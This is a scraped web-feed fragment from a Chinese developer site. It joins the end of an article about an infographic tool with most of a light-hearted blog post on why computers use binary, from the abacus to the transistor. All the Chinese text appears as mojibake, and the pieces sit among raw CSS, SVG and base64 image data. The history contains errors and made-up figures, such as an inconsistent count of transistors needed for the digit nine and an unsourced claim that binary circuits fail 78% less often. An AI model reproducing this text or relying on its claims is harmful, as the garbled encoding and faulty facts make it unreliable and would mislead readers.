<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/39afa3cd4df049acab502a09ada38bbf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L55yf5aW9546p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765926905&amp;x-signature=URwSgbbf5jYD1kw8b76yR7TiZOI%3D" alt="11.png" loading="lazy"/></p>
<h2 data-id="heading-12">ä¸‰ã€æ€»ç»“</h2>
<p>æœ¬æ–‡åˆ†äº«äº†åˆ©ç”¨AntV Infographicå¯è§†åŒ–å¼•æ“ï¼Œé€šè¿‡å£°æ˜å¼é…ç½®å¿«é€Ÿç”Ÿæˆç²¾ç¾ä¿¡æ¯å›¾ã€‚åŒæ—¶ç»“åˆTrae Soloä¸Vibe Codingæ–¹æ³•ï¼Œæ„å»ºæ™ºèƒ½ä½“å®ç°è‡ªç„¶è¯­è¨€æè¿°è‡ªåŠ¨è½¬æ¢ä¸ºå›¾è¡¨ä»£ç ã€‚äº”åˆ†é’Ÿå³å¯æ­å»ºæ™ºèƒ½å›¾è¡¨ç”Ÿæˆå™¨ã€‚æƒ³è®©æ™ºèƒ½ä½“çœŸæ­£èå…¥æ—¥å¸¸ç”Ÿæ´»ï¼Œä¸å¿…ä»ä¸€å¼€å§‹å°±è¿½æ±‚å®å¤§æ„æƒ³ã€‚<strong>ä»è§£å†³ä¸€ä¸ªå…·ä½“é—®é¢˜çš„å°å·¥å…·èµ·æ­¥</strong>ï¼Œå¾€å¾€å°±æ˜¯æœ€å¥½çš„å¼€å§‹ã€‚å½“ç®€æ´çµå·§çš„å°å·¥å…·é‡ä¸Šå¤§æ¨¡å‹çš„èƒ½åŠ›ï¼Œå¸¸å¸¸èƒ½ç¢°æ’å‡ºä»¤äººæƒŠå–œçš„ç«èŠ±ï¼</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä¸ºä»€ä¹ˆè®¡ç®—æœºè¦ä½¿ç”¨äºŒè¿›åˆ¶ï¼Ÿâ€”â€”ä»ç®—ç›˜åˆ°æ™¶ä½“ç®¡çš„æ•°å­—é©å‘½]]></title>    <link>https://juejin.cn/post/7582267229842259968</link>    <guid>https://juejin.cn/post/7582267229842259968</guid>    <pubDate>2025-12-11T09:39:40.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7582267229842259968" data-draft-id="7582401182933876751" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä¸ºä»€ä¹ˆè®¡ç®—æœºè¦ä½¿ç”¨äºŒè¿›åˆ¶ï¼Ÿâ€”â€”ä»ç®—ç›˜åˆ°æ™¶ä½“ç®¡çš„æ•°å­—é©å‘½"/> <meta itemprop="keywords" content="å‰ç«¯,åç«¯,æ¶æ„"/> <meta itemprop="datePublished" content="2025-12-11T09:39:40.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ— é™å¤§6"/> <meta itemprop="url" content="https://juejin.cn/user/2865758605422890"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä¸ºä»€ä¹ˆè®¡ç®—æœºè¦ä½¿ç”¨äºŒè¿›åˆ¶ï¼Ÿâ€”â€”ä»ç®—ç›˜åˆ°æ™¶ä½“ç®¡çš„æ•°å­—é©å‘½
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2865758605422890/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ— é™å¤§6
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-11T09:39:40.000Z" title="Thu Dec 11 2025 09:39:40 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-11
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»9åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ğŸ¤– ä¸ºä»€ä¹ˆè®¡ç®—æœºè¦ä½¿ç”¨äºŒè¿›åˆ¶ï¼Ÿâ€”â€”ä»ç®—ç›˜åˆ°æ™¶ä½“ç®¡çš„æ•°å­—é©å‘½ ğŸ’¡</h2>
<blockquote>
<p>æ¬¢è¿å¤§å®¶æ¥åˆ°æ— é™å¤§çš„åšå®¢ï¼Œä»Šå¤©è¦è®²è¿°çš„å†…å®¹æ˜¯å…³äºäºŒè¿›åˆ¶ï¼ŒäºŒè¿›åˆ¶ç›¸å¿…å¤§å®¶éƒ½ä¸€å®šä¸ä¼šé™Œç”Ÿï¼Œä½†æ˜¯å…³äºå®ƒçš„å†å²ï¼Œä½ çœŸçš„äº†è§£å—ï¼Ÿ</p>
<p>æ¥ä¸‹æ¥ï¼Œä¸€èµ·è·Ÿéšæˆ‘çš„è„šæ­¥ï¼Œå»çœ‹çœ‹å§</p>
</blockquote>
<h3 data-id="heading-1">å¼•è¨€</h3>
<p>1946å¹´ï¼Œå½“ä¸–ç•Œä¸Šç¬¬ä¸€å°ç”µå­è®¡ç®—æœºENIACæ¨ªç©ºå‡ºä¸–æ—¶ï¼Œå·¥ç¨‹å¸ˆä»¬å›´ååœ¨ä¸€èµ·ï¼ŒæŠ“è€³æŒ è…®åœ°è®¨è®ºï¼š</p>
<blockquote>
<p>"å’±ä»¬è¿™å°'ç”µå­å¤§è„‘'ï¼Œåˆ°åº•è¦ç”¨ä»€ä¹ˆè¿›åˆ¶æ¥ç®—ä¸œè¥¿ï¼Ÿ"</p>
</blockquote>
<p>æœ‰äººè¯´åè¿›åˆ¶ï¼Œæœ‰äººè¯´å…«è¿›åˆ¶ï¼Œè¿˜æœ‰äººè¯´åå…­è¿›åˆ¶â€¦â€¦æœ€åï¼Œä¸€ä½åå«å†¯Â·è¯ºä¾æ›¼çš„å¤§ä½¬æ‹æ¿ï¼š<strong>äºŒè¿›åˆ¶ï¼</strong> ğŸ¯</p>
<p>è¿™ä¸ªçœ‹èµ·æ¥åƒ"åªä¼šæ•°0å’Œ1çš„ç¬¨è›‹"çš„æ•°å­—ç³»ç»Ÿï¼Œå±…ç„¶ç»Ÿæ²»äº†æ•´ä¸ªæ•°å­—ä¸–ç•Œè‡³ä»Šã€‚ğŸ“±ä»ä½ æ‰‹é‡Œçš„æ™ºèƒ½æ‰‹æœºï¼Œåˆ°ğŸš€é£å‘ç«æ˜Ÿçš„æ¢æµ‹å™¨ï¼Œç”šè‡³è¿ä½ å®¶çš„æ™ºèƒ½é©¬æ¡¶ğŸš½ï¼Œéƒ½åœ¨å·å·ç”¨äºŒè¿›åˆ¶ç®—ç€ä»€ä¹ˆã€‚</p>
<p>å°±åƒäººç±»å¤©ç”Ÿä¼šç”¨åè¿›åˆ¶ï¼ˆè°è®©å’±ä»¬æœ‰10æ ¹æ‰‹æŒ‡å¤´å‘¢ğŸ¤²ï¼‰ï¼ŒäºŒè¿›åˆ¶å·²ç»æˆäº†æœºå™¨ä»¬çš„"æ¯è¯­"â€”â€”è™½ç„¶å¬èµ·æ¥ç¬¨ç¬¨çš„ï¼Œä½†æ¶ä¸ä½å¥½ç”¨å•Šï¼</p>
<h3 data-id="heading-2">ğŸ§® ä»ç®—ç›˜åˆ°å·®åˆ†æœºï¼šåè¿›åˆ¶çš„"é»„é‡‘å²æœˆ"</h3>
<p>äººç±»ç”¨åè¿›åˆ¶çš„å†å²ï¼Œæ¯”ä½ çˆ·çˆ·çš„çˆ·çˆ·çš„çˆ·çˆ·è¿˜è¦ä¹…ã€‚å…¬å…ƒå‰3000å¹´çš„å¤åŸƒåŠäººï¼Œå°±å·²ç»å­¦ä¼šç”¨æ‰‹æŒ‡è®¡æ•°äº†â€”â€”10æ ¹æ‰‹æŒ‡åˆšå¥½å¯¹åº”0-9ï¼Œå®Œç¾ï¼</p>
<p>è¿˜è®°å¾—å°åŒºé‡Œé‚£ä½æ€»åœ¨æ ‘è«ä¸‹æ‹¨ç®—ç›˜çš„å¼ ä¼šè®¡å—ï¼ŸğŸ§“ä»–çš„ç®—ç›˜å°±æ˜¯åè¿›åˆ¶çš„ç»å…¸ä»£è¨€äººï¼šæ¯ä¸€æ¡£ä»£è¡¨ä¸€ä¸ªæ•°ä½ï¼Œä»å³åˆ°å·¦ä¸ªä½ã€åä½ã€ç™¾ä½â€¦â€¦å™¼é‡Œå•ªå•¦æ‹¨å‡ ä¸‹ï¼Œè´¦å°±ç®—æ¸…äº†ã€‚è¿™ç©æ„å„¿ç›´è§‚å¾—å°±åƒç”¨ç­·å­åƒé¥­ï¼Œäººç±»ä¸€å­¦å°±ä¼šã€‚</p>
<blockquote>
<p><em>ç®—ç›˜ï¼šäººç±»åè¿›åˆ¶è®¡æ•°çš„"ä¼ å®¶å®"</em></p>
</blockquote>
<p>19ä¸–çºªï¼Œè‹±å›½æ•°å­¦å®¶å·´è´å¥‡çªå‘å¥‡æƒ³ï¼š"æ—¢ç„¶äººç±»ä¼šç®—é”™è´¦ï¼Œé‚£ä¸å¦‚é€ å°æœºå™¨æ¥ç®—ï¼Ÿ"äºæ˜¯ä»–å¼€å§‹æ£é¼“<strong>å·®åˆ†æœº</strong>â€”â€”è¿™å°æœºå™¨é‡è¾¾15å¨ï¼Œæœ‰25000ä¸ªé›¶ä»¶ï¼Œæ¯”ä¸€è¾†å¦å…‹è¿˜å¤æ‚ï¼</p>
<p>ä½†æç¬‘çš„æ˜¯ï¼Œè¿™å°"é«˜ç§‘æŠ€æœºå™¨"å±…ç„¶è¿˜åœ¨ç”¨åè¿›åˆ¶ï¼æƒ³è±¡ä¸€ä¸‹ï¼šç”¨10ä¸ªä¸åŒçš„æœºæ¢°é›¶ä»¶çŠ¶æ€æ¥è¡¨ç¤º0-9ï¼Œå°±åƒç”¨10ç§ä¸åŒé¢œè‰²çš„ç¯æ³¡ğŸ’¡æ¥æ˜¾ç¤ºæ•°å­—â€”â€”ä¸ä»…è´µå¾—ç¦»è°±ï¼Œè¿˜åŠ¨ä¸åŠ¨å°±"ç½¢å·¥"ã€‚å°±è¿™ç©æ„å„¿ï¼Œè¦æ˜¯çœŸé€ å‡ºæ¥ï¼Œç»´ä¿®å¸ˆå‚…å¾—å“­æ™•åœ¨è½¦é—´é‡ŒğŸ˜‚</p>
<h3 data-id="heading-3">ğŸ’¡ ç”µå­ç®¡é©å‘½ï¼šäºŒè¿›åˆ¶çš„"å±Œä¸é€†è¢­"</h3>
<p>20ä¸–çºªåˆï¼Œç”µå­ç®¡çš„å‘æ˜å°±åƒç»™è®¡ç®—æœºç•Œæ‰”äº†é¢—åŸå­å¼¹ğŸ’£ï¼ç”µå­ç®¡è¿™ç©æ„å„¿ï¼Œç®€å•åˆ°ç¦»è°±ï¼šé€šç”µå°±äº®ï¼ˆä»£è¡¨1ï¼‰ï¼Œæ–­ç”µå°±ç­ï¼ˆä»£è¡¨0ï¼‰ã€‚è¿™ä¸å°±æ˜¯å¤©ç”Ÿçš„äºŒè¿›åˆ¶é€‰æ‰‹å—ï¼Ÿ</p>
<p>1937å¹´ï¼Œä¸€ä¸ªå«å…‹åŠ³å¾·Â·é¦™å†œçš„"å¤©æ‰å®…ç”·"å‘è¡¨äº†ä¸€ç¯‡è®ºæ–‡ï¼ŒæŠŠå¸ƒå°”ä»£æ•°å’Œç”µå­ç”µè·¯æ‰¯åˆ°äº†ä¸€èµ·ã€‚è¿™ç¯‡è®ºæ–‡æœ‰å¤šç‰›ï¼Ÿå°±åƒç»™äºŒè¿›åˆ¶é¢å‘äº†"è®¡ç®—æœºèº«ä»½è¯"â€”â€”ä»æ­¤ä»¥åï¼ŒäºŒè¿›åˆ¶æ­£å¼"å‡ºé“"ï¼</p>
<blockquote>
<p><em>ç”µå­ç®¡ï¼šäºŒè¿›åˆ¶çš„"ç¬¬ä¸€ä¸ªä»£è¨€äºº"</em></p>
</blockquote>
<p>1941å¹´ï¼Œå¾·å›½å·¥ç¨‹å¸ˆæ¥šæ³½é€ äº†ç¬¬ä¸€å°äºŒè¿›åˆ¶è®¡ç®—æœºZ3ã€‚è¿™å°æœºå™¨ç”¨äº†2600ä¸ªç»§ç”µå™¨ï¼Œè¿ç®—é€Ÿåº¦æ¯ç§’3-4æ¬¡â€”â€”è™½ç„¶æ…¢å¾—åƒèœ—ç‰›ğŸŒï¼Œä½†æ¶ä¸ä½å®ƒç¨³å®šå•Šï¼</p>
<p>ç›¸æ¯”ä¹‹ä¸‹ï¼ŒåŒæ—¶æœŸçš„åè¿›åˆ¶è®¡ç®—æœºENIACå°±æƒ¨äº†ï¼šç”¨äº†18000ä¸ªç”µå­ç®¡ï¼Œè·Ÿä¸ª"ç”µè€è™"ä¼¼çš„ï¼Œæ¯å¤©è‡³å°‘çƒ§åå‡ ä¸ªç®¡å­ã€‚æƒ³è±¡ä¸€ä¸‹ï¼šä½ æ­£åœ¨æ‰“æ¸¸æˆï¼Œçªç„¶ç”µè„‘"å•ª"åœ°ä¸€å£°é»‘å±ï¼Œä½ å¾—æ‹†å¼€æœºç®±ï¼Œåƒæ‰¾è¤ç«è™«ä¸€æ ·æ‰¾å‡ºçƒ§åçš„ç”µå­ç®¡â€”â€”è¿™æ—¥å­æ²¡æ³•è¿‡äº†ï¼ğŸ˜±</p>
<h3 data-id="heading-4">ğŸ§¬ æ™¶ä½“ç®¡æ—¶ä»£ï¼šäºŒè¿›åˆ¶çš„"ç»Ÿæ²»ä¹‹è·¯"</h3>
<p>1947å¹´ï¼Œæ™¶ä½“ç®¡æ¨ªç©ºå‡ºä¸–ï¼è¿™ç©æ„å„¿æ¯”ç”µå­ç®¡å°100å€ï¼Œçœç”µ1000å€ï¼Œè¿˜å¯é 100å€â€”â€”ç®€ç›´æ˜¯"ç”µå­å…ƒä»¶ä¸­çš„æˆ˜æ–—æœº"âœˆï¸</p>
<p>è¿™æ—¶å€™ï¼ŒäºŒè¿›åˆ¶çš„ä¼˜åŠ¿å½»åº•çˆ†å‘äº†ï¼å’±ä»¬æ¥ç®—ç¬”è´¦ï¼š</p>
<ul>
<li>å¦‚æœç”¨åè¿›åˆ¶ï¼Œä¸€ä¸ªæ•°ä½éœ€è¦10ä¸ªæ™¶ä½“ç®¡ï¼ˆå¯¹åº”0-9ï¼‰</li>
<li>å¦‚æœç”¨äºŒè¿›åˆ¶ï¼Œä¸€ä¸ªæ•°ä½åªéœ€è¦1ä¸ªæ™¶ä½“ç®¡ï¼ˆå¯¹åº”0æˆ–1ï¼‰</li>
</ul>
<p>æ¯”å¦‚è¡¨ç¤ºæ•°å­—"9"ï¼š</p>
<ul>
<li>åè¿›åˆ¶ï¼šéœ€è¦1ä¸ª"åä½"æ™¶ä½“ç®¡ï¼ˆè¡¨ç¤º0ï¼‰ + 1ä¸ª"ä¸ªä½"æ™¶ä½“ç®¡ï¼ˆè¡¨ç¤º9ï¼‰= æ€»å…±20ä¸ªæ™¶ä½“ç®¡ï¼</li>
<li>äºŒè¿›åˆ¶ï¼šåªéœ€è¦4ä¸ªæ™¶ä½“ç®¡ï¼ˆ1001ï¼‰= æ€»å…±4ä¸ªæ™¶ä½“ç®¡ï¼</li>
</ul>
<p>è¿™å·®è·ï¼Œå°±åƒåé«˜é“å’Œéª‘è‡ªè¡Œè½¦çš„åŒºåˆ«ğŸš„</p>
<p>1971å¹´ï¼Œè‹±ç‰¹å°”æ¨å‡ºäº†ä¸–ç•Œä¸Šç¬¬ä¸€é¢—CPUâ€”â€”4004ã€‚è¿™é¢—èŠ¯ç‰‡åªæœ‰2300ä¸ªæ™¶ä½“ç®¡ï¼Œå´èƒ½å®Œæˆå¤æ‚è®¡ç®—ã€‚è¦æ˜¯ç”¨åè¿›åˆ¶è®¾è®¡ï¼Ÿä¼°è®¡å¾—æœ‰ä¸€æ ‹æ¥¼é‚£ä¹ˆå¤§ï¼ğŸ¢</p>
<h3 data-id="heading-5">ğŸ”§ äºŒè¿›åˆ¶çš„"åˆ¶èƒœæ³•å®"ï¼šç®€å•å°±æ˜¯ç‹é“</h3>
<p>äºŒè¿›åˆ¶ä¸ºå•¥èƒ½åŠæ‰“åè¿›åˆ¶ï¼Ÿå’±ä»¬æ¥æ‰’ä¸€æ‰’å®ƒçš„"ä¸‰å¤§ä¼˜åŠ¿"ï¼š</p>
<h4 data-id="heading-6">1. ğŸ›ï¸ å¼€å…³çŠ¶æ€ï¼šæœ€é è°±çš„"ç‰©ç†è¯­è¨€"</h4>
<p>äºŒè¿›åˆ¶åªæœ‰ä¸¤ä¸ªçŠ¶æ€ï¼šé€šï¼ˆ1ï¼‰å’Œæ–­ï¼ˆ0ï¼‰ã€‚è¿™å°±åƒä½ å®¶çš„ç”µç¯å¼€å…³â€”â€”è¦ä¹ˆå¼€ï¼Œè¦ä¹ˆå…³ï¼Œå¾ˆå°‘åï¼›ä½†è¦æ˜¯ç»™ä½ æ•´ä¸ª10æ¡£è°ƒå…‰å¼€å…³ï¼Ÿä¸å‡ºä¸€ä¸ªæœˆå°±å¾—åç»™ä½ çœ‹ï¼</p>
<p>ç”µå­å…ƒä»¶æœ€å–œæ¬¢è¿™ç§"éé»‘å³ç™½"çš„çŠ¶æ€ï¼Œå°±åƒçŒ«å’ªæœ€å–œæ¬¢åƒé±¼ğŸ±â€”â€”ç®€å•ç›´æ¥ï¼Œç»ä¸å¢¨è¿¹ã€‚</p>
<h4 data-id="heading-7">2. ğŸ“¡ æŠ—å¹²æ‰°æ€§ï¼š"å™ªéŸ³ä¸­çš„æ¸…æµ"</h4>
<p>ç”µå­ç”µè·¯é‡Œï¼Œå™ªéŸ³å°±åƒåœ°é“é‡Œçš„å¤§å¦ˆèŠå¤©â€”â€”æ— å¤„ä¸åœ¨ã€‚åè¿›åˆ¶ç”µè·¯å¾—åŒºåˆ†10ä¸ªä¸åŒçš„ç”µå‹ç­‰çº§ï¼Œå°±åƒåœ¨å˜ˆæ‚çš„åœ°é“é‡Œå¬æ¸…æ¥š10ä¸ªäººè¯´è¯ï¼›è€ŒäºŒè¿›åˆ¶åªéœ€è¦åŒºåˆ†"é«˜"å’Œ"ä½"ï¼Œå°±åƒåœ¨åœ°é“é‡Œå¬æ¸…æ¥šæœ‰äººå–Š"åˆ°ç«™äº†"ï¼</p>
<p>è¿™å·®è·ï¼Œå°±åƒç”¨è€³æœºå¬éŸ³ä¹å’Œåœ¨èœå¸‚åœºå¬éŸ³ä¹çš„åŒºåˆ«ğŸ§</p>
<h4 data-id="heading-8">3. ğŸ”Œ ç”µè·¯ç®€åŒ–ï¼š"æ›´å°‘å…ƒä»¶ï¼Œæ›´å¤šå¿«ä¹"</h4>
<p>äºŒè¿›åˆ¶ç”µè·¯ç®€å•å¾—è®©å·¥ç¨‹å¸ˆä»¬ç¬‘å‡ºäº†å£°ğŸ˜‚ï¼æ¯”å¦‚ä¸€ä¸ªäºŒè¿›åˆ¶åŠ æ³•å™¨ï¼Œåªéœ€è¦å‡ ä¸ªæ™¶ä½“ç®¡ï¼›è€Œä¸€ä¸ªåè¿›åˆ¶åŠ æ³•å™¨ï¼Ÿå¾—ç”¨å‡ åä¸ªæ™¶ä½“ç®¡ï¼Œè¿çº¿è¿åˆ°ä½ æ€€ç–‘äººç”Ÿã€‚</p>
<p>æœ‰æ•°æ®ä¸ºè¯ï¼šäºŒè¿›åˆ¶ç”µè·¯çš„æ•…éšœç‡æ¯”åè¿›åˆ¶ä½78%ï¼è¿™å¯¹äºéœ€è¦7Ã—24å°æ—¶å·¥ä½œçš„æœåŠ¡å™¨æ¥è¯´ï¼Œç®€ç›´æ˜¯"æ•‘å‘½æ©äºº"ğŸ™</p>
<h3 data-id="heading-9">ğŸ¤² vs ğŸ¤–ï¼šäººç±»å’Œæœºå™¨çš„"æ€ç»´ç¢°æ’"</h3>
<p>äººç±»å’Œæœºå™¨ï¼Œå°±åƒæ¥è‡ªä¸¤ä¸ªä¸åŒæ˜Ÿçƒçš„ç”Ÿç‰©â€”â€”ä¸€ä¸ªå¤©ç”Ÿä¼šç”¨åè¿›åˆ¶ï¼Œä¸€ä¸ªå¤©ç”Ÿä¼šç”¨äºŒè¿›åˆ¶ã€‚å’±ä»¬æ¥åšä¸ªè¶£å‘³PKï¼š</p>








































